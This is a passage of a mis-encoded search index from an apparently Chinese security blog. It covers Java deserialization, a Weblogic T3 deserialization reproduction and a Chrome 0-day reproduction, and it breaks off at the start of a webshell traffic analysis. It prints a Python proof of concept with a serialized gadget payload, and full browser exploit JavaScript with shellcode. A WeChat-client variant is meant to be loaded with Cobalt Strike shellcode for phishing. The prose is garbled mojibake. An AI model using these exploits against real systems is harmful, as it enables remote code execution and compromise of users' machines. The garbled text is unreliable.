è¿™é‡Œåœ¨åºåˆ—åŒ–æ—¶ä¸å‘é€è¯·æ±‚ï¼Œé˜²æ­¢åœ¨ååºåˆ—åŒ–æ¢æµ‹æ—¶è¯¯åˆ¤ Class c = u.getClass(); Field f = c.getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(u, 1234); ht.put(u, \"Geekby\"); // æŠŠ hashcode æ”¹ä¸º -1ï¼Œè¿˜åŸ f.set(u, -1); ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:4:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.2 åˆ†æ é¦–å…ˆæŸ¥çœ‹ HashMap çš„ ReadObject æ–¹æ³• 339 è¡Œï¼šåœ¨è°ƒç”¨ putVal æ–¹æ³•ä¹‹å‰ä¼šè°ƒç”¨ hash æ–¹æ³•ï¼ŒæŸ¥çœ‹å…¶æºä»£ç ï¼š 899 - 903 è¡Œï¼šå¦‚æœ key == nullï¼Œhashcode èµ‹å€¼ä¸º 0ã€‚key å­˜åœ¨çš„è¯ï¼Œåˆ™è°ƒç”¨ key çš„ hashcode æ–¹æ³•ã€‚ åœ¨æœ¬ gadget ä¸­ï¼Œkey ä¸º URL å¯¹è±¡ã€‚æ¥ç€ï¼Œè·Ÿè¿› URL çš„ hashCode æ–¹æ³•ã€‚ URL ç±»çš„ hashCode å¾ˆç®€å•ã€‚å¦‚æœ hashcode ä¸ä¸º -1ï¼Œåˆ™è¿”å› hashcodeã€‚åœ¨åºåˆ—åŒ–æ„é€  payload çš„æ—¶å€™ï¼Œéœ€è¦è®¾ç½® hashcode ä¸º -1 çš„åŸå› ï¼Œå°±æ˜¯é˜²æ­¢è¿›å…¥åˆ° hashcode æ–¹æ³•ä¸­ï¼Œè¿›è€Œå‘é€ DNS è¯·æ±‚ï¼Œå½±å“åˆ¤æ–­ã€‚ å½“ hashcode==-1 ï¼Œè°ƒç”¨ handler çš„ hashCode æ–¹æ³•ã€‚è¯¥ç±»çš„å®šä¹‰åœ¨ URL çš„æ„é€ å‡½æ•°ä¸­ï¼Œä¸»è¦æ˜¯æ ¹æ® scheme å»å†³å®šç”¨ä»€ä¹ˆç±»åš handlerã€‚åœ¨è¿™é‡Œæ˜¯ URLStreamHandler ç±»ï¼Œè·Ÿè¿› URLStreamHandler çš„ hashcode æ–¹æ³•ã€‚ åœ¨ç¬¬ 359 è¡Œï¼Œè°ƒç”¨ getHostAddress è·å–åŸŸåå¯¹åº”çš„ IPã€‚ DNSURL é“¾ä¾¿æ˜¯åˆ©ç”¨è¯¥å¤„ï¼Œæ¥è§¦å‘ DNSLog å‘é€è¯·æ±‚ã€‚ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:4:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒ phith0n Java æ¼«è°ˆç³»åˆ— Javaååºåˆ—åŒ–æ¼æ´åŸç†è§£æ Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°å…³é—¨ ä»0å¼€å§‹å­¦Javaååºåˆ—åŒ–æ¼æ´ æ·±å…¥ç†è§£ JAVA ååºåˆ—åŒ–æ¼æ´ Javaååºåˆ—åŒ–åˆ©ç”¨é“¾è¡¥å…¨è®¡åˆ’ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["æ¼æ´å¤ç°"],"content":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Weblogic","æ¼æ´å¤ç°"],"title":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´å¤ç° ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Weblogic","æ¼æ´å¤ç°"],"title":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1 ç¯å¢ƒæ­å»º ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Weblogic","æ¼æ´å¤ç°"],"title":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.1 ç¯å¢ƒå‡†å¤‡ Weblogic ç¯å¢ƒé‡‡ç”¨ A-Team çš„ docker ä¸€é”®æ­å»ºï¼šhttps://github.com/QAX-A-Team/WeblogicEnvironment JDK å®‰è£…åŒ…ä¸‹è½½åœ°å€ï¼šhttps://www.oracle.com/technetwork/java/javase/archive-139210.html ä¸‹è½½ç‰ˆæœ¬ä¸ºï¼šjdk-7u21-linux-x64.tar.gz Weblogic å®‰è£…åŒ…ä¸‹è½½åœ°å€ï¼šhttps://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html ä¸‹è½½ç‰ˆæœ¬ä¸ºï¼šfmw_12.1.3.0.0_wls.jar ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["Weblogic","æ¼æ´å¤ç°"],"title":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.2 æ„å»ºé•œåƒ ä»¥ Weblogic12.1.3 é… JDK 7u21 ä¸ºä¾‹ï¼Œæ„å»ºé•œåƒå‘½ä»¤å¦‚ä¸‹ï¼š docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.1.3.0.0_wls.jar -t weblogic12013jdk7u21 . é•œåƒæ„å»ºå®Œæˆåï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿è¡Œï¼š docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic12013jdk7u21 weblogic12013jdk7u21 è¿è¡Œåå¯è®¿é—®http://localhost:7001/console/login/LoginForm.jspç™»å½•åˆ°Weblogic Serverç®¡ç†æ§åˆ¶å°ï¼Œé»˜è®¤ç”¨æˆ·åä¸ºweblogic,é»˜è®¤å¯†ç ä¸ºqaxateam01 ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:2","tags":["Weblogic","æ¼æ´å¤ç°"],"title":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2 æ¼æ´å¤ç° pocå¦‚ä¸‹ï¼Œç›®å‰è¯¥ POC åªæœ‰å›æ˜¾ï¼š #!/usr/bin/python import socket import os import sys import struct import time # if len(sys.argv) \u003c 2: # print 'Usage: python %s \u003cTARGET_HOST\u003e \u003cPORT\u003e' % os.path.basename(sys.argv[0]) # sys.exit() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) server_address = (\"127.0.0.1\", 7001) # print '[+] Connecting to %s port %s' % server_address sock.connect(server_address) # Send headers headers='t3 9.2.0.0\\nAS:255\\nHL:92\\nMS:10000000\\nPU:t3://abcdefghijklmnabcdefghijklmnabcdefghijklmnabcdefghijklmnabcdefghijklmnabcdefghijklmn:7001\\n\\n' print 'sending \"%s\"' % headers sock.sendall(headers) data = sock.recv(1024) print \u003e\u003esys.stderr, 'received \"%s\"' % data payloadObj='\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x17\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x4c\\x69\\x6e\\x6b\\x65\\x64\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xd8\\x6c\\xd7\\x5a\\x95\\xdd\\x2a\\x1e\\x02\\x00\\x00\\x78\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xba\\x44\\x85\\x95\\x96\\xb8\\xb7\\x34\\x03\\x00\\x00\\x78\\x70\\x77\\x0c\\x00\\x00\\x00\\x10\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x02\\x73\\x72\\x00\\x19\\x6a\\x61\\x76\\x61\\x2e\\x72\\x6d\\x69\\x2e\\x4d\\x61\\x72\\x73\\x68\\x61\\x6c\\x6c\\x65\\x64\\x4f\\x62\\x6a\\x65\\x63\\x74\\x7c\\xbd\\x1e\\x97\\xed\\x63\\xfc\\x3e\\x02\\x00\\x03\\x49\\x00\\x04\\x68\\x61\\x73\\x68\\x5b\\x00\\x08\\x6c\\x6f\\x63\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x5b\\x00\\x08\\x6f\\x62\\x6a\\x42\\x79\\x74\\x65\\x73\\x71\\x00\\x7e\\x00\\x04\\x78\\x70\\xea\\x0c\\xa3\\xad\\x70\\x75\\x72\\x00\\x02\\x5b\\x42\\xac\\xf3\\x17\\xf8\\x06\\x08\\x54\\xe0\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x10\\xea\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x17\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x4c\\x69\\x6e\\x6b\\x65\\x64\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xd8\\x6c\\xd7\\x5a\\x95\\xdd\\x2a\\x1e\\x02\\x00\\x00\\x78\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xba\\x44\\x85\\x95\\x96\\xb8\\xb7\\x34\\x03\\x00\\x00\\x78\\x70\\x77\\x0c\\x00\\x00\\x00\\x10\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x02\\x73\\x72\\x00\\x3a\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x78\\x61\\x6c\\x61\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x78\\x73\\x6c\\x74\\x63\\x2e\\x74\\x72\\x61\\x78\\x2e\\x54\\x65\\x6d\\x70\\x6c\\x61\\x74\\x65\\x73\\x49\\x6d\\x70\\x6c\\x09\\x57\\x4f\\xc1\\x6e\\xac\\xab\\x33\\x03\\x00\\x08\\x49\\x00\\x0d\\x5f\\x69\\x6e\\x64\\x65\\x6e\\x74\\x4e\\x75\\x6d\\x62\\x65\\x72\\x49\\x00\\x0e\\x5f\\x74\\x72\\x61\\x6e\\x73\\x6c\\x65\\x74\\x49\\x6e\\x64\\x65\\x78\\x5a\\x00\\x15\\x5f\\x75\\x73\\x65\\x53\\x65\\x72\\x76\\x69\\x63\\x65\\x73\\x4d\\x65\\x63\\x68\\x61\\x6e\\x69\\x73\\x6d\\x4c\\x00\\x0b\\x5f\\x61\\x75\\x78\\x43\\x6c\\x61\\x73\\x73\\x65\\x73\\x74\\x00\\x3b\\x4c\\x63\\x6f\\x6d\\x2f\\x73\\x75\\x6e\\x2f\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68\\x65\\x2f\\x78\\x61\\x6c\\x61\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x78\\x73\\x6c\\x74\\x63\\x2f\\x72\\x75\\x6e\\x74\\x69\\x6d\\x65\\x2f\\x48\\x61\\x73\\x68\\x74\\x61\\x62\\x6c\\x65\\x3b\\x5b\\x00\\x0a\\x5f\\x62\\x79\\x74\\x65\\x63\\x6f\\x64\\x65\\x73\\x74\\x00\\x03\\x5b\\x5b\\x42\\x5b\\x00\\x06\\x5f\\x63\\x6c\\x61\\x73\\x73\\x74\\x00\\x12\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x43\\x6c\\x61\\x73\\x73\\x3b\\x4c\\x00\\x05\\x5f\\x6e\\x61\\x6d\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x11\\x5f\\x6f\\x75\\x74\\x70\\x75\\x74\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x69\\x65\\x73\\x74\\x00\\x16\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x69\\x65\\x73\\x3b\\x78\\x70\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x70\\x75\\x72\\x00\\x03\\x5b\\x5b\\x42\\x4b\\xfd\\x19\\x15\\x67\\x67\\xdb\\x37\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x75\\x72\\x00\\x02\\x5b\\x42\\xac\\xf3\\x17\\xf8\\x06\\x08\\x54\\xe0\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x0d\\x7a\\xca\\xfe\\xba\\xbe\\x00\\x00\\x00\\x32\\x00\\xac\\x0a\\x00\\x26\\x00\\x5a\\x0a\\x00\\x5b\\x00\\x5c\\x0a\\x00\\x5b\\x00\\x5d\\x08\\x00\\x5e\\x0a\\x00\\x5f\\x00\\x60\\x08\\x00\\x61\\x07\\x00\\x62\\x0a\\x00\\x07\\x00\\x63\\x07\\x00\\x64\\x0a\\x00\\x65\\x00\\x66\\x09\\x00\\x67\\x00\\x68\\x0a\\x00\\x69\\x00\\x6a\\x08\\x00\\x6b\\x07\\x00\\x4d\\x0a\\x00\\x09\\x00\\x6c\\x08\\x00\\x6d\\x0a\\x00\\x07\\x00\\x6e\\x0a\\x00\\x6f\\x00\\x70\\x0a\\x00\\x6f\\x00\\x71\\x0a\\x00\\x07\\x00\\x72\\x08\\x00\\x73\\x07\\x00\\x74\\x0a\\x00\\x16\\x00\\x75\\x08\\x00\\x76\\x07\\x00\\x3d\\x08\\x00\\x77\\x07\\x00\\x78\\x08\\x00\\x79\\x0a\\x00\\x7a\\x00\\x7b\\x0a\\x00\\x1b\\x00\\x7c\\x0a\\x00\\x1b\\x00\\x7d\\x08\\x00\\x7e\\x0a\\x00\\x69\\","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Weblogic","æ¼æ´å¤ç°"],"title":"Weblogic T3 ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"Chrome 0Day å¤ç°ä¸æ€è€ƒ","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/","tags":["Chrome","æ¼æ´å¤ç°"],"title":"Chrome 0Day å¤ç°ä¸æ€è€ƒ","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"Chrome 0Day å¤ç°ä¸æ€è€ƒ ","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:0:0","tags":["Chrome","æ¼æ´å¤ç°"],"title":"Chrome 0Day å¤ç°ä¸æ€è€ƒ","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1 æ¼æ´å¤ç° HW æœŸé—´çˆ†å‡ºäº† Chrome 0Dayï¼Œå¤ç°ä¸€æ‰‹ã€‚ https://github.com/avboy1337/1195777-chrome0day å¼¹è®°äº‹æœ¬çš„ POCï¼š \u003cscript\u003e function gc() { for (var i = 0; i \u003c 0x80000; ++i) { var a = new ArrayBuffer(); } } let shellcode = [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00]; var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]); var wasmModule = new WebAssembly.Module(wasmCode); var wasmInstance = new WebAssembly.Instance(wasmModule); var main = wasmInstance.exports.main; var bf = new ArrayBuffer(8); var bfView = new DataView(bf); function fLow(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(0, true)); } function fHi(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(4, true)) } function i2f(low, hi) { bfView.setUint32(0, low, true); bfView.setUint32(4, hi, true); return bfView.getFloat64(0, true); } function f2big(f) { bfView.setFloat64(0, f, true); return bfView.getBigUint64(0, true); } function big2f(b) { bfView.setBigUint64(0, b, true); return bfView.getFloat64(0, true); } class LeakArrayBuffer extends ArrayBuffer { constructor(size) { super(size); this.slot = 0xb33f; } } function foo(a) { let x = -1; if (a) x = 0xFFFFFFFF; var arr = new Array(Math.sign(0 - Math.max(0, x, -1))); arr.shift(); let local_arr = Array(2); local_arr[0] = 5.1;//4014666666666666 let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8 arr[0] = 0x1122; return [arr, local_arr, buff]; } for (var i = 0; i \u003c 0x10000; ++i) foo(false); gc(); gc(); [corrput_arr, rwarr, corrupt_buff] = foo(true); corrput_arr[12] = 0x22444; delete corrput_arr; function setbackingStore(hi, low) { rwarr[4] = i2f(fLow(rwarr[4]), hi); rwarr[5] = i2f(low, fHi(rwarr[5])); } function leakObjLow(o) { corrupt_buff.slot = o; return (fLow(rwarr[9]) - 1); } let corrupt_view = new DataView(corrupt_buff); let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff); let idx0Addr = corrupt_buffer_ptr_low - 0x10; let baseAddr = (corrupt_buffer_ptr_low \u0026 0xffff0000) - ((corrupt_buffer_ptr_low \u0026 0xffff0000) % 0x40000) + 0x40000; let delta = baseAddr + 0x1c - id","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:1:0","tags":["Chrome","æ¼æ´å¤ç°"],"title":"Chrome 0Day å¤ç°ä¸æ€è€ƒ","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2 æ€è€ƒ windows å¾®ä¿¡å®¢æˆ·ç«¯ä¸‹å†…ç½®çš„ Chrome æµè§ˆå™¨é»˜è®¤å…³é—­æ²™ç®±æ¨¡å¼ï¼Œä½†æ˜¯æ˜¯ 32 ä½çš„ï¼Œå¦‚æœæœ‰é’ˆå¯¹ 32 ä½çš„ payloadï¼Œå°±å¯ä»¥åˆ©ç”¨ win ä¸‹çš„å®¢æˆ·ç«¯è¿›è¡Œé’“é±¼ã€‚ ","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:2:0","tags":["Chrome","æ¼æ´å¤ç°"],"title":"Chrome 0Day å¤ç°ä¸æ€è€ƒ","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"3 åç»­è¡¥å…… windows å¾®ä¿¡å®¢æˆ·ç«¯ payloadï¼š ENABLE_LOG = true; IN_WORKER = true; // input your shellcode var shellcode = [0x00,0x00]; function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i \u003c 0x10000; ++i) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return 'c01db33f'; } function gc() { for (var i = 0; i \u003c 0x10000; ++i) { new String(); } } function oobAccess() { var this_ = this; this.buffer = null; this.buffer_view = null; this.page_buffer = null; this.page_view = null; this.prevent_opt = []; var kSlotOffset = 0x1f; var kBackingStoreOffset = 0xf; class LeakArrayBuffer extends ArrayBuffer { constructor() { super(0x1000); this.slot = this; } } this.page_buffer = new LeakArrayBuffer(); this.page_view = new DataView(this.page_buffer); new RegExp({ toString: function () { return 'a' } }); cb(true); class DerivedBase extends RegExp { constructor() { // var array = null; super( // at this point, the 4-byte allocation for the JSRegExp `this` object // has just happened. { toString: cb }, 'g' // now the runtime JSRegExp constructor is called, corrupting the // JSArray. ); // this allocation will now directly follow the FixedArray allocation // made for `this.data`, which is where `array.elements` points to. this_.buffer = new ArrayBuffer(0x80); g_array[8] = this_.page_buffer; } } // try{ var derived_n = eval(`(function derived_n(i) { if (i == 0) { return DerivedBase; } class DerivedN extends derived_n(i-1) { constructor() { super(); return; ${\"this.a=0;\".repeat(tDerivedNCount)} } } return DerivedN; })`); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view = new DataView(this.buffer); this.leakPtr = function (obj) { this.page_buffer.slot = obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); } this.setPtr = function (addr) { this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); } this.read32 = function (addr) { this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); } this.write32 = function (addr, value) { this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); } this.write8 = function (addr, value) { this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); } this.setBytes = function (addr, content) { for (var i = 0; i \u003c content.length; i++) { this.write8(addr + i, content[i]); } } return this; } function trigger() { var oob = oobAccess(); var func_ptr = oob.leakPtr(target_function); print('[*] target_function at 0x' + func_ptr.toString(16)); var kCodeInsOffset = 0x1b; var code_addr = oob.read32(func_ptr + kCodeInsOffset); print('[*] code_addr at 0x' + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0); } try{ print(\"start running\"); trigger(); }catch(e){ print(e); } ç”¨ cs ç”Ÿæˆ 32 ä½çš„ payloadï¼Œæ·»åŠ åˆ°ä¸Šé¢è„šæœ¬çš„ shellcode å˜é‡ä¸­ ç‚¹å‡»é“¾æ¥ï¼š æ‰§è¡Œï¼š ä¸Šçº¿ï¼š ","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:3:0","tags":["Chrome","æ¼æ´å¤ç°"],"title":"Chrome 0Day å¤ç°ä¸æ€è€ƒ","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"webshell æµé‡åˆ†æ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"webshell æµé‡åˆ†æ æœ¬æ–‡ä»¥å“¥æ–¯æ‹‰å’Œå†°èä¸ºä¾‹ï¼Œå¯¹ä¸Šè¿°ä¸¤ä¸ªåœ¨æ”»é˜²å¯¹æŠ—ä¸­å¸¸ç”¨çš„åŠ å¯†å‹ webshell çš„æµé‡è¿›è¡Œåˆ†æã€‚ ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:0:0","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 Godzilla ç”±äºå“¥æ–¯æ‹‰åœ¨å¤„ç† jsp å’Œ php æ—¶åŠ å¯†æ–¹å¼å­˜åœ¨å·®å¼‚ï¼Œæœ¬æ–‡å°†ä» php 